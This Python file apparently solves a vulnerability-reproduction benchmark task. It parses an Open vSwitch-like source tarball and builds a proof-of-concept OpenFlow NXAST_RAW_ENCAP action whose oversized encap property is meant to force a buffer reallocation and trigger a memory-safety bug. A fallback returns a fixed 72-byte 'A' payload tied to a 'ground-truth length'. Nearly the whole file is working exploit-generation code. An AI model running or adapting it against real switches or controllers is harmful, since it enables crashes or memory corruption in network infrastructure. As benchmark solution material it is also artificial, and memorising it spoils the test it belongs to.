import tarfile
import re
import struct as pystruct
import ast
from collections import namedtuple

StructField = namedtuple('StructField', ['name', 'type', 'size', 'offset'])


class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            return self._generate_poc(src_path)
        except Exception:
            # Fallback: deterministic dummy payload of ground-truth length.
            return b'A' * 72

    # ======================= High-level PoC generation =======================

    def _generate_poc(self, src_path: str) -> bytes:
        texts, stripped = self._read_tar_texts(src_path)

        headers_text = "\n".join(
            stripped[name] for name in stripped if name.endswith('.h')
        )
        if not headers_text:
            headers_text = "\n".join(stripped.values())

        # Parse enums from headers.
        enum_map = self._parse_enums(headers_text)

        # NX vendor ID.
        nx_vendor = self._find_nx_vendor_id(headers_text)
        if nx_vendor is None:
            nx_vendor = 0x00002320

        # NXAST_RAW_ENCAP subtype.
        nx_raw_encap_subtype = self._find_nx_raw_encap_subtype(headers_text, enum_map)
        if nx_raw_encap_subtype is None:
            nx_raw_encap_subtype = 0  # Very unlikely, but fallback.

        # Build struct bodies map from headers.
        struct_bodies = self._build_struct_bodies(headers_text)
        struct_cache = {}

        # nx_action_raw_encap header info.
        try:
            nx_raw_fields = self._get_struct_fields('nx_action_raw_encap', struct_bodies, struct_cache)
        except Exception:
            nx_raw_fields = []

        header_size_nx = self._compute_struct_size(nx_raw_fields)
        if header_size_nx == 0:
            # Fallback guess.
            header_size_nx = 24

        header_offsets = self._locate_nx_header_offsets(nx_raw_fields, struct_bodies, struct_cache, header_size_nx)

        # Analyze decode_ed_prop to get property struct, class/type enums.
        decode_ed_prop_text = self._find_function(stripped, 'decode_ed_prop')
        prop_struct_name, class_enum_name, type_enum_name = self._analyze_decode_ed_prop(decode_ed_prop_text)

        # Property struct info.
        try:
            prop_fields = self._get_struct_fields(prop_struct_name, struct_bodies, struct_cache)
        except Exception:
            prop_fields = []

        header_size_prop = self._compute_struct_size(prop_fields)
        if header_size_prop == 0:
            # Generic fallback: class(2) + type(1) + len(1)
            header_size_prop = 4
            len_size = 1
            len_is_be = False
            len_offset = 3
            class_offset = 0
            class_size = 2
            type_offset = 2
            type_size = 1
        else:
            len_field = None
            for f in prop_fields:
                if f.name == 'len' or f.name.endswith('_len'):
                    len_field = f
                    break
            if len_field is None:
                # Fallback: assume last 1 byte is len.
                len_size = 1
                len_is_be = False
                len_offset = header_size_prop - 1
            else:
                len_size = len_field.size
                len_is_be = 'be' in len_field.type
                len_offset = len_field.offset

            class_field = None
            for f in prop_fields:
                if 'class' in f.name:
                    class_field = f
                    break
            if class_field is None and prop_fields:
                class_field = prop_fields[0]
            if class_field is None:
                class_offset = 0
                class_size = 2
            else:
                class_offset = class_field.offset
                class_size = class_field.size

            type_field = None
            for f in prop_fields:
                if f.name == 'type':
                    type_field = f
                    break
            if type_field is None and len(prop_fields) >= 2:
                type_field = prop_fields[1]
            if type_field is None:
                type_offset = class_offset + class_size
                type_size = 1
            else:
                type_offset = type_field.offset
                type_size = type_field.size

        # Compute property lengths.
        max_len = (1 << (8 * len_size)) - 1
        # Want reasonably large to likely force ofpbuf reallocation.
        desired_total_len = min(max_len, header_size_prop + 128)
        if desired_total_len <= header_size_prop + 8:
            desired_total_len = min(max_len, header_size_prop + 32)
        if desired_total_len <= header_size_prop:
            desired_total_len = max_len

        prop_len_val = desired_total_len
        prop_data_len = max(prop_len_val - header_size_prop, 0)

        # Align property block to 8 bytes (common for OpenFlow actions/properties).
        prop_total_len = self._align(prop_len_val, 8)

        # Build property bytes.
        prop_bytes = bytearray(prop_total_len)

        # Class and type numeric values.
        prop_class_val = enum_map.get(class_enum_name, 0) if class_enum_name else 0
        prop_type_val = enum_map.get(type_enum_name, 0) if type_enum_name else 0

        # Write class.
        self._write_integer(prop_bytes, class_offset, class_size, prop_class_val, big_endian=('be' in self._field_type_for_offset(prop_fields, class_offset) if prop_fields else True))

        # Write type.
        self._write_integer(prop_bytes, type_offset, type_size, prop_type_val, big_endian=False)

        # Write len.
        self._write_integer(prop_bytes, len_offset, len_size, prop_len_val, big_endian=len_is_be)

        # Fill property data region with pattern bytes.
        for i in range(prop_data_len):
            idx = header_size_prop + i
            if idx < len(prop_bytes):
                prop_bytes[idx] = 0x41  # 'A'

        # Complete NX action bytes.
        total_len = header_size_nx + prop_total_len
        total_len = self._align(total_len, 8)
        if total_len < header_size_nx + prop_total_len:
            total_len = header_size_nx + prop_total_len

        nx_bytes = bytearray(total_len)
        # Copy properties right after header.
        end_prop = header_size_nx + len(prop_bytes)
        if end_prop > len(nx_bytes):
            nx_bytes.extend(b'\x00' * (end_prop - len(nx_bytes)))
        nx_bytes[header_size_nx:header_size_nx + len(prop_bytes)] = prop_bytes

        # Write NX header fields.
        type_field = header_offsets.get('type')
        len_field_nx = header_offsets.get('len')
        vendor_field = header_offsets.get('vendor')
        subtype_field = header_offsets.get('subtype')

        if type_field:
            self._write_integer(nx_bytes, type_field.offset, type_field.size, 0xFFFF, big_endian=True)
        if vendor_field:
            self._write_integer(nx_bytes, vendor_field.offset, vendor_field.size, nx_vendor, big_endian=True)
        if subtype_field:
            self._write_integer(nx_bytes, subtype_field.offset, subtype_field.size, nx_raw_encap_subtype, big_endian=True)
        if len_field_nx:
            len_is_be_nx = 'be' in len_field_nx.type
            self._write_integer(nx_bytes, len_field_nx.offset, len_field_nx.size, header_size_nx + prop_total_len, big_endian=len_is_be_nx)

        return bytes(nx_bytes)

    # =========================== Tarball utilities ===========================

    def _read_tar_texts(self, src_path):
        texts = {}
        stripped = {}
        with tarfile.open(src_path, 'r:*') as tar:
            for member in tar.getmembers():
                if not member.isfile():
                    continue
                name = member.name
                if not (name.endswith('.c') or name.endswith('.h')):
                    continue
                f = tar.extractfile(member)
                if not f:
                    continue
                try:
                    data = f.read().decode('utf-8', errors='ignore')
                finally:
                    f.close()
                texts[name] = data
                stripped[name] = self._strip_comments(data)
        return texts, stripped

    def _strip_comments(self, text: str) -> str:
        # Remove /* ... */ comments.
        text = re.sub(r'/\*.*?\*/', '', text, flags=re.S)
        # Remove // ... comments.
        text = re.sub(r'//.*', '', text)
        return text

    # ============================== Enum parsing ==============================

    def _parse_enums(self, text: str):
        enum_map = {}
        pattern = re.compile(r'enum\s+(?:\w+)?\s*{(.*?)};', re.S)
        for m in pattern.finditer(text):
            body = m.group(1)
            parts = body.split(',')
            current_val = -1
            for part in parts:
                part = part.strip()
                if not part:
                    continue
                m2 = re.match(r'([A-Za-z_][A-Za-z0-9_]*)\s*(?:=\s*(.+))?$', part)
                if not m2:
                    continue
                name = m2.group(1)
                expr = m2.group(2)
                if expr is not None:
                    val = self._eval_const_expr(expr, enum_map)
                else:
                    val = 0 if current_val == -1 else current_val + 1
                enum_map[name] = val
                current_val = val
        return enum_map

    def _eval_const_expr(self, expr: str, names):
        expr = expr.strip()
        # Remove integer suffixes like U, L, UL, ULL.
        expr = re.sub(r'(?i)(?<=\d)[uUlL]+', '', expr)
        try:
            node = ast.parse(expr, mode='eval').body
        except SyntaxError:
            return 0

        def eval_node(n):
            if isinstance(n, ast.Constant):
                if isinstance(n.value, int):
                    return n.value
                return 0
            if isinstance(n, ast.Name):
                return names.get(n.id, 0)
            if isinstance(n, ast.UnaryOp):
                val = eval_node(n.operand)
                if isinstance(n.op, ast.USub):
                    return -val
                if isinstance(n.op, ast.UAdd):
                    return +val
                if isinstance(n.op, ast.Invert):
                    return ~val
                return 0
            if isinstance(n, ast.BinOp):
                left = eval_node(n.left)
                right = eval_node(n.right)
                op = n.op
                if isinstance(op, ast.Add):
                    return left + right
                if isinstance(op, ast.Sub):
                    return left - right
                if isinstance(op, ast.Mult):
                    return left * right
                if isinstance(op, ast.FloorDiv) or isinstance(op, ast.Div):
                    if right == 0:
                        return 0
                    return left // right
                if isinstance(op, ast.Mod):
                    if right == 0:
                        return 0
                    return left % right
                if isinstance(op, ast.LShift):
                    return left << right
                if isinstance(op, ast.RShift):
                    return left >> right
                if isinstance(op, ast.BitOr):
                    return left | right
                if isinstance(op, ast.BitAnd):
                    return left & right
                if isinstance(op, ast.BitXor):
                    return left ^ right
                return 0
            return 0

        try:
            return eval_node(node)
        except Exception:
            return 0

    # ============================= NX constants ==============================

    def _find_nx_vendor_id(self, text: str):
        m = re.search(r'#define\s+NX_VENDOR_ID\s+(0x[0-9A-Fa-f]+|\d+)', text)
        if not m:
            return None
        try:
            return int(m.group(1), 0)
        except ValueError:
            return None

    def _find_nx_raw_encap_subtype(self, text: str, enum_map):
        m = re.search(r'NXAST_RAW_ENCAP\s*=\s*([^,\s]+)', text)
        if m:
            expr = m.group(1)
            return self._eval_const_expr(expr, enum_map)
        # Fall back to enum map if already parsed.
        return enum_map.get('NXAST_RAW_ENCAP')

    # ============================ Struct extraction ==========================

    def _build_struct_bodies(self, text: str):
        structs = {}
        i = 0
        n = len(text)
        while True:
            idx = text.find('struct ', i)
            if idx == -1:
                break
            j = idx + len('struct ')
            while j < n and text[j].isspace():
                j += 1
            start_name = j
            while j < n and (text[j].isalnum() or text[j] == '_'):
                j += 1
            name = text[start_name:j]
            if not name:
                i = idx + 6
                continue
            while j < n and text[j].isspace():
                j += 1
            if j >= n or text[j] != '{':
                i = idx + 6
                continue
            # Parse brace block.
            depth = 0
            k = j
            while k < n:
                ch = text[k]
                if ch == '{':
                    depth += 1
                elif ch == '}':
                    depth -= 1
                    if depth == 0:
                        end = k
                        break
                k += 1
            else:
                break
            body = text[j + 1:end]
            if name not in structs:
                structs[name] = body
            i = end + 1
        return structs

    def _get_struct_fields(self, name, struct_bodies, cache):
        if name in cache:
            return cache[name]
        body = struct_bodies.get(name)
        if body is None:
            raise KeyError(f"Struct {name} not found")
        fields = []
        offset = 0
        # Split body into statements by ';'
        for stmt in body.split(';'):
            s = stmt.strip()
            if not s:
                continue
            if '{' in s or '}' in s:
                continue
            # Multiple declarators separated by ','
            parts = [p.strip() for p in s.split(',') if p.strip()]
            if not parts:
                continue
            # First part has type + first var.
            first = parts[0]
            tokens = first.split()
            if len(tokens) < 2:
                continue
            base_type_tokens = tokens[:-1]
            first_var = tokens[-1]
            base_type = ' '.join(base_type_tokens)
            # Remaining parts are additional variables of same type.
            var_tokens = [first_var] + parts[1:]

            for v in var_tokens:
                m = re.match(r'([A-Za-z_][A-Za-z0-9_]*)\s*(\[\s*(\d+)\s*])?$', v)
                if not m:
                    continue
                var_name = m.group(1)
                arr_len_str = m.group(3)
                if arr_len_str is None:
                    arr_len = 1
                else:
                    arr_len = int(arr_len_str)
                base_size = self._get_base_type_size(base_type, struct_bodies, cache)
                # Flexible array (size 0) does not contribute to header size.
                size = base_size * arr_len
                fields.append(StructField(var_name, base_type, size, offset))
                offset += size
        cache[name] = fields
        return fields

    def _get_base_type_size(self, btype: str, struct_bodies, cache):
        t = btype.strip()
        # Remove qualifiers.
        qualifiers = {'const', 'volatile', 'signed', 'unsigned', 'OVS_PACKED',
                      'OVS_GCC4_PACKED', 'OVS_GCC4_ALIGN', 'OVS_PACKED_STRUCT'}
        toks = [tok for tok in t.replace('*', ' ').split() if tok not in qualifiers]
        if not toks:
            return 4
        t = ' '.join(toks)
        # Handle 'struct Name'
        if t.startswith('struct '):
            name = t.split()[1]
            fields = self._get_struct_fields(name, struct_bodies, cache)
            return self._compute_struct_size(fields)
        # Primitive/network types.
        mapping = {
            'uint8_t': 1, 'int8_t': 1, 'char': 1,
            'uint16_t': 2, 'int16_t': 2,
            'uint32_t': 4, 'int32_t': 4,
            'uint64_t': 8, 'int64_t': 8,
            'ovs_be16': 2, 'ovs_be32': 4, 'ovs_be64': 8,
            'ovs_16aligned_be32': 4, 'ovs_32aligned_be64': 8,
        }
        if t in mapping:
            return mapping[t]
        # Pointer type.
        if '*' in btype:
            return 8
        # Fallback guess.
        return 4

    def _compute_struct_size(self, fields):
        if not fields:
            return 0
        last = fields[-1]
        return last.offset + last.size

    def _locate_nx_header_offsets(self, nx_fields, struct_bodies, cache, header_size_nx):
        offsets = {}
        lookup = {f.name: f for f in nx_fields}
        # Direct fields?
        if all(name in lookup for name in ('type', 'len', 'vendor', 'subtype')):
            for n in ('type', 'len', 'vendor', 'subtype'):
                offsets[n] = lookup[n]
            return offsets
        # Nested nx_action_header?
        for f in nx_fields:
            if 'struct' in f.type and 'nx_action_header' in f.type:
                try:
                    hdr_fields = self._get_struct_fields('nx_action_header', struct_bodies, cache)
                except Exception:
                    break
                hdr_lookup = {hf.name: hf for hf in hdr_fields}
                if all(name in hdr_lookup for name in ('type', 'len', 'vendor', 'subtype')):
                    for name in ('type', 'len', 'vendor', 'subtype'):
                        hf = hdr_lookup[name]
                        offsets[name] = StructField(
                            name=name,
                            type=hf.type,
                            size=hf.size,
                            offset=f.offset + hf.offset
                        )
                    return offsets
        # Fallback: assume canonical NX header layout at start.
        if header_size_nx >= 16:
            offsets['type'] = StructField('type', 'ovs_be16', 2, 0)
            offsets['len'] = StructField('len', 'ovs_be16', 2, 2)
            offsets['vendor'] = StructField('vendor', 'ovs_be32', 4, 4)
            offsets['subtype'] = StructField('subtype', 'ovs_be16', 2, 8)
        return offsets

    def _field_type_for_offset(self, fields, offset):
        for f in fields:
            if f.offset == offset:
                return f.type
        return ''

    # ========================= Function / decode_ed_prop =====================

    def _find_function(self, stripped_texts, func_name: str):
        pattern = re.compile(re.escape(func_name) + r'\s*\([^)]*\)\s*{')
        for text in stripped_texts.values():
            m = pattern.search(text)
            if m:
                return self._extract_function_body(text, m.start())
        return None

    def _extract_function_body(self, text: str, start_idx: int) -> str:
        n = len(text)
        brace_idx = text.find('{', start_idx)
        if brace_idx == -1:
            return ''
        depth = 0
        i = brace_idx
        while i < n:
            ch = text[i]
            if ch == '{':
                depth += 1
            elif ch == '}':
                depth -= 1
                if depth == 0:
                    return text[brace_idx:i + 1]
            i += 1
        return text[brace_idx:]

    def _extract_brace_block_from(self, text: str, start_idx: int) -> str:
        n = len(text)
        brace_idx = text.find('{', start_idx)
        if brace_idx == -1:
            return ''
        depth = 0
        i = brace_idx
        while i < n:
            ch = text[i]
            if ch == '{':
                depth += 1
            elif ch == '}':
                depth -= 1
                if depth == 0:
                    return text[brace_idx:i + 1]
            i += 1
        return text[brace_idx:]

    def _analyze_decode_ed_prop(self, func_text: str):
        prop_struct_name = None
        class_enum_name = None
        type_enum_name = None

        if not func_text:
            return 'nx_action_ed_prop', None, None

        m = re.search(r'(?:const\s+)?struct\s+(\w*ed_prop\w*)\s*\*', func_text)
        if m:
            prop_struct_name = m.group(1)

        # Find switch on ->class
        m = re.search(r'switch\s*\(([^)]*->\s*class[^)]*)\)\s*{', func_text)
        if m:
            class_switch_body = self._extract_brace_block_from(func_text, m.start())
            case_pattern = re.compile(r'case\s+([A-Za-z_][A-Za-z0-9_]*)\s*:')
            cases = list(case_pattern.finditer(class_switch_body))
            if cases:
                class_enum_name = cases[0].group(1)
                start = cases[0].end()
                end = cases[1].start() if len(cases) > 1 else len(class_switch_body)
                case_block = class_switch_body[start:end]
                # Inside this case, look for switch on ->type
                mt = re.search(r'switch\s*\(([^)]*->\s*type[^)]*)\)\s*{', case_block)
                if mt:
                    type_switch_body = self._extract_brace_block_from(case_block, mt.start())
                    mtc = case_pattern.search(type_switch_body)
                    if mtc:
                        type_enum_name = mtc.group(1)

        if prop_struct_name is None:
            prop_struct_name = 'nx_action_ed_prop'
        return prop_struct_name, class_enum_name, type_enum_name

    # ============================= Byte helpers ==============================

    def _align(self, n: int, align: int) -> int:
        r = n % align
        return n if r == 0 else n + (align - r)

    def _write_integer(self, buf: bytearray, offset: int, size: int, value: int, big_endian: bool):
        if offset < 0 or offset + size > len(buf):
            return
        if size == 1:
            buf[offset] = value & 0xFF
        elif size == 2:
            fmt = '>H' if big_endian else '<H'
            buf[offset:offset + 2] = pystruct.pack(fmt, value & 0xFFFF)
        elif size == 4:
            fmt = '>I' if big_endian else '<I'
            buf[offset:offset + 4] = pystruct.pack(fmt, value & 0xFFFFFFFF)
        elif size == 8:
            fmt = '>Q' if big_endian else '<Q'
            buf[offset:offset + 8] = pystruct.pack(fmt, value & 0xFFFFFFFFFFFFFFFF)
        else:
            # For unsupported sizes, write least-significant bytes big-endian.
            tmp = value
            for i in range(size):
                idx = offset + (size - 1 - i if big_endian else i)
                buf[idx] = tmp & 0xFF
                tmp >>= 8
